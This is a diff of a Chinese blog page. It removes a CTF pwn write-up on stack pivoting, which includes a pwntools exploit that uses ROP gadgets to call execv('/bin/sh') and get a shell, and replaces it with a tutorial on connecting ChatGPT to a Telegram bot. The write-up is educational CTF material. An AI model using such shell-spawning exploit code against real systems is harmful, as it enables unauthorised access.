@@ -139,10 +139,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="http://l0tus.vip/cn/stackmove/">
+  <link rel="canonical" href="http://l0tus.vip/cn/tgbot/">
   <title>
     
-      Stackmove - l0tus&#39; blog
+      ChatGPT接入Telegram Bot教程 - l0tus&#39; blog
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -352,19 +352,19 @@
     .body--light {
       /* intro-header */
       --intro-header-background-image-url-home: url('/img/header_img/cat.png');
-      --intro-header-background-image-url-post: url('/img/header_img/stackmove_header.png');
-      --intro-header-background-image-url-page: url('//img/header_img/stackmove_header.png');
+      --intro-header-background-image-url-post: url('/img/header_img/universe.jpg');
+      --intro-header-background-image-url-page: url('//img/header_img/universe.jpg');
     }
     .body--dark {
       --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/cat.png');
-      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/stackmove_header.png');
-      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/stackmove_header.png');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/img/header_img/universe.jpg');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//img/header_img/universe.jpg');
     }
 
     header.intro-header {
        /*post*/
         background-image: var(--intro-header-background-image-url-post);
-        /* background-image: url('/img/header_img/stackmove_header.png'); */
+        /* background-image: url('/img/header_img/universe.jpg'); */
       
     }
 
@@ -389,16 +389,16 @@
           <div class="post-heading">
             <div class="tags">
               
-              <a class="tag" href="/tags/#pwn笔记" title="pwn笔记">pwn笔记</a>
+              <a class="tag" href="/tags/#ChatGPT" title="ChatGPT">ChatGPT</a>
               
-              <a class="tag" href="/tags/#stackmove" title="stackmove">stackmove</a>
+              <a class="tag" href="/tags/#Bot" title="Bot">Bot</a>
               
             </div>
-            <h1>Stackmove</h1>
-            <h2 class="subheading"></h2>
+            <h1>ChatGPT接入Telegram Bot教程</h1>
+            <h2 class="subheading">一次简单的开发经历</h2>
             <span class="meta">
               Posted by l0tus on
-              2022-12-15
+              2023-02-20
             </span>
 
 
@@ -406,11 +406,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">1</span> Minutes
+              Estimated Reading Time <span class="post-count">3</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">455</span> In Total
+              Words <span class="post-count">834</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -472,38 +472,94 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h2 id="开篇碎碎念">开篇碎碎念</h2>
-<p>近期的进度应该已经进入堆题的学习阶段了，但是我还没有完整做过一道栈迁移的题。倍感惭愧，正好前几天赛博的比赛nameless✌出了一道栈迁移，可惜当时时间很紧。我的想法是现学堆题的知识，然后把ez_heap整出来，但是我太菜了就把大把的时间花费在了理解堆管理器上，到结束也没做出来。也就没心思看这道栈迁移了，不过回头看来，这道题应该是当时可以拿下的。</p>
-<h1>题目</h1>
-<p><img src="stackmove_1.png" alt="test"><br>
-题目给了execve的地址，可以直接拿来利用。在main函数里有一次read用来布置目标栈<br>
-vul函数里有一次read用来劫持rbp、rsp<br>
-<img src="stackmove_2.png" alt="test"><br>
-利用ROPgadget可以找到<strong>pop rsi r15</strong>和<strong>pop rdi</strong>,用来布置栈<br>
-利用栈迁移时需要用到两条关键的汇编指令：<br>
-<strong>leave</strong> 相当于 <strong>mov esp，ebp；pop ebp</strong><br>
-<strong>ret</strong> 相当于 <strong>pop eip</strong><br>
-我们需要做的就是劫持rbp,将其覆盖为我们想要迁移的位置，再使用leave这条指令，将rbp传入rsp，从而使劫持程序，让其返回到我们布置好的栈上。<br>
-<img src="stackmove_3.png" alt="test"><br>
-这是布置好的bss段和buf<br>
-<img src="stackmove_4.png" alt="test"><br>
-<img src="stackmove_5.png" alt="test"><br>
-调试的时候可以看到一些关键的覆盖</p>
-<h1>exp</h1>
-<p>直接从nameless✌那里抄来的exp，懒狗懒得自己写了</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=remote(&#x27;124.222.96.143&#x27;,10000)</span></span><br><span class="line">io=process(<span class="string">&quot;./stackmove&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stackmove&#x27;</span>)<span class="comment">#io=process(&#x27;./b&#x27;)</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x400851</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400853</span></span><br><span class="line">lea_ret=<span class="number">0x400708</span></span><br><span class="line">stack_addr=<span class="number">0x600ca0</span></span><br><span class="line"><span class="comment">#io.recvuntil(&#x27;global_buf:&#x27;)</span></span><br><span class="line"><span class="comment">#stack_addr=int(io.recv(8),16)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;execv:&#x27;</span>)</span><br><span class="line">execv_addr=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">payload1=p64(pop_rdi_ret)+p64(stack_addr)+p64(pop_rsi_r15_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execv_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;global:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+payload1)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;input:&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span>+p64(stack_addr)+p64(lea_ret)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive( )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <blockquote>
+<p>目前主流的方法有两种，其中一种已经失效</p>
+</blockquote>
+<h1>接入openai.com官方的API keys</h1>
+<blockquote>
+<p>这种方式实现的是单句问答，无上下文，也是目前唯一可实现的方式。</p>
+</blockquote>
+<h2 id="前提">前提</h2>
+<blockquote>
+<p>拥有一台海外vps（为什么是海外，因为telegram bot在收发指令时会先经过telegram服务器再发送到自己的vps，如果再国内则会被墙）</p>
+</blockquote>
+<h2 id="创建tg-bot">创建tg bot</h2>
+<p>1、tg搜素BotFather<br>
+2、<code>/start</code><br>
+3、<code>/newbot</code><br>
+4、输入bot的name，按照自己喜欢的起，这里以<code>空格</code>为例<br>
+4、输入bot的用户名，必须以<code>_bot</code>结尾，这里以<code>W4t3r_Blank_bot</code>为例<br>
+5、done，复制API，添加bot</p>
+<h2 id="配置vps环境">配置vps环境</h2>
+<p>假设目前您的vps是一片空白没有任何配置，那么最首先需要做的就是一些配置文件<br>
+XShell连接vps<br>
+分别安装<br>
+git<br>
+<code>sudo apt-get install git</code><br>
+golang<br>
+<code>sudo apt-get install golang</code><br>
+nodejs<br>
+<code>curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -</code><br>
+<code>sudo apt-get install nodejs</code><br>
+amd64架构的linux系统似乎会自带vim，如果没有的话也需要装一下vim<br>
+<code>sudo apt install vim</code><br>
+安装pm2守护进程<br>
+<code>npm install pm2 -g</code></p>
+<h2 id="导入github项目">导入github项目</h2>
+<p>分别执行以下三条命令<br>
+<code>git clone https://github.com/harshitethic/chatgpt-bot-telegram.git</code><br>
+<code>cd chatgpt-bot-telegram</code><br>
+<code>npm install</code></p>
+<h2 id="获取自己openai-com的API-KEY">获取自己openai.com的API KEY</h2>
+<p>去这个链接获取API key：<a target="_blank" rel="noopener" href="https://platform.openai.com/account/api-keys">https://platform.openai.com/account/api-keys</a><br>
+前提是有自己的openai账号，具体注册请参照网上其他教程<br>
+在API keys的界面下点击 <code>Create new secret key</code>,复制，记录这个API</p>
+<h2 id="修改-env文件">修改.env文件</h2>
+<p>安装完后进入chatgpt-bot-telegram文件夹，执行<code>vim .env</code><br>
+将chatgpt的API和bot的API分别写入对应的位置<br>
+保存，退出（<code>:,wq,enter</code>）</p>
+<h2 id="执行">执行</h2>
+<p><code>pm2 start index.js</code><br>
+这条命令执行完之后bot已经开始运作了，可以进行对话，交互的语句开头加上<code>/ask </code>即可对话，但是无上下文，只能单句对话。回答也很官方莫得感情。</p>
+<h2 id="后台守护">后台守护</h2>
+<p>利用screen工具<br>
+首先关闭进程，<code>pm2 stop all</code><br>
+再分别执行以下两条指令<br>
+<code>apt-get install screen</code><br>
+<code>screen -S chatgpt</code><br>
+这样一来相当于是起了一个新的screen，在这里面再执行上面启动bot的命令即可后台守护执行，这样在关闭vps链接以后bot也可以照常运作。</p>
+<h1>接入GPT对话网页cookie（已失效）</h1>
+<p>原理和上述完全一致</p>
+<h2 id="获取对话cookie">获取对话cookie</h2>
+<p><a target="_blank" rel="noopener" href="https://chat.openai.com/chat">https://chat.openai.com/chat</a><br>
+f12，请求里找到cookie，复制粘贴备用</p>
+<h2 id="导入github文件">导入github文件</h2>
+<p>这个库是https://github.com/m1guelpf/chatgpt-telegram，其中源文件需要到readme里面给的releases page去下载对应系统版本的文件，我这里是linux-amd64版本，arm架构和macos用户自己下载对应的版本。<br>
+传入vps的方法是用Xftp，其他如果不是Xshell用户可以用自带的文件传输功能进行传输</p>
+<h2 id="修改-env">修改.env</h2>
+<p>这里的.env起始文件叫做env.example。<code>TELEGRAM_ID</code>建议不写可以做到多人使用，<code>TELEGRAM_TOKEN</code>写bot API。保存退出。<br>
+<code>cp env.example .env</code><br>
+重命名为.env</p>
+<h2 id="config">.config</h2>
+<p>根目录下新建.config文件<code>mkdir .config</code>,cd进入该文件，<code>vim chatgpt.json</code>，这里面写网页cookie<br>
+<code>&#123; &quot;openaisession&quot;: &quot;cookie&quot; &#125;</code></p>
+<h2 id="执行-2">执行</h2>
+<p>进入文件目录，<code>./chatgpt-telegram</code></p>
+<h2 id="后台守护-2">后台守护</h2>
+<p>同上</p>
+<h2 id="结果">结果</h2>
+<p>并不能执行捏，大家就不需要尝试这种方法了（</p>
+<h1>extra</h1>
+<p>vps推荐：<a target="_blank" rel="noopener" href="https://my.vultr.com/">https://my.vultr.com/</a></p>
+
 
         <hr>
         <!-- Pager -->
         <ul class="pager">
           
-          <li class="previous">
-            <a href="/cn/省赛babyheap/" data-toggle="tooltip" data-placement="top" title="迟到三个月的省赛wp">&larr; Previous Post</a>
-          </li>
-          
           
           <li class="next">
-            <a href="/cn/ez_heap/" data-toggle="tooltip" data-placement="top" title="tcache_poisoning">Next Post &rarr;</a>
+            <a href="/cn/pwnable.tw-start-WP/" data-toggle="tooltip" data-placement="top" title="pwnable.tw-start-WP">Next Post &rarr;</a>
           </li>
           
         </ul>
@@ -552,7 +608,7 @@ vul函数里有一次read用来劫持rbp、rsp<br>
       </a>
     </li>
     <li class="social-share-li">
-      <a target="_blank" class="social-share-icon" href="mailto:?subject=Stackmove&body=Hi,I found this website and thought you might like it http://l0tus.vip/cn/stackmove/">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=ChatGPT接入Telegram Bot教程&body=Hi,I found this website and thought you might like it http://l0tus.vip/cn/tgbot/">
         <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
       </a>
     </li>
@@ -587,7 +643,7 @@ vul函数里有一次read用来劫持rbp、rsp<br>
       repo: '',
       owner: '',
       admin: '',
-      id: 'Thu Dec 15 2022 00:00:00 GMT+0800', // Ensure uniqueness and length less than 50
+      id: 'Mon Feb 20 2023 01:36:00 GMT+0800', // Ensure uniqueness and length less than 50
       distractionFreeMode: false, // Facebook-like distraction free mode
       perPage: 10,
       pagerDirection: 'last',
@@ -640,7 +696,7 @@ vul函数里有一次read用来劫持rbp、rsp<br>
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%BC%80%E7%AF%87%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">开篇碎碎念</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number"></span> <span class="toc-nav-text">题目</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number"></span> <span class="toc-nav-text">exp</span></a>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">接入openai.com官方的API keys</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">前提</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%88%9B%E5%BB%BAtg-bot"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">创建tg bot</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E9%85%8D%E7%BD%AEvps%E7%8E%AF%E5%A2%83"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">配置vps环境</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%AF%BC%E5%85%A5github%E9%A1%B9%E7%9B%AE"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">导入github项目</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%8E%B7%E5%8F%96%E8%87%AA%E5%B7%B1openai-com%E7%9A%84API-KEY"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">获取自己openai.com的API KEY</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%BF%AE%E6%94%B9-env%E6%96%87%E4%BB%B6"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">修改.env文件</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-nav-number">1.7.</span> <span class="toc-nav-text">执行</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%90%8E%E5%8F%B0%E5%AE%88%E6%8A%A4"><span class="toc-nav-number">1.8.</span> <span class="toc-nav-text">后台守护</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">接入GPT对话网页cookie（已失效）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%AF%9Dcookie"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">获取对话cookie</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%AF%BC%E5%85%A5github%E6%96%87%E4%BB%B6"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">导入github文件</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E4%BF%AE%E6%94%B9-env"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">修改.env</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#config"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">.config</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E6%89%A7%E8%A1%8C-2"><span class="toc-nav-number">2.5.</span> <span class="toc-nav-text">执行</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E5%90%8E%E5%8F%B0%E5%AE%88%E6%8A%A4-2"><span class="toc-nav-number">2.6.</span> <span class="toc-nav-text">后台守护</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-nav-number">2.7.</span> <span class="toc-nav-text">结果</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">extra</span></a></li></ol>
         
         </div>
       </aside>
@@ -663,9 +719,9 @@ vul函数里有一次read用来劫持rbp、rsp<br>
           </h5>
           <div class="tags">
             
-            <a class="tag" href="/tags/#pwn笔记" title="pwn笔记">pwn笔记</a>
+            <a class="tag" href="/tags/#ChatGPT" title="ChatGPT">ChatGPT</a>
             
-            <a class="tag" href="/tags/#stackmove" title="stackmove">stackmove</a>
+            <a class="tag" href="/tags/#Bot" title="Bot">Bot</a>
             
           </div>
         </section>
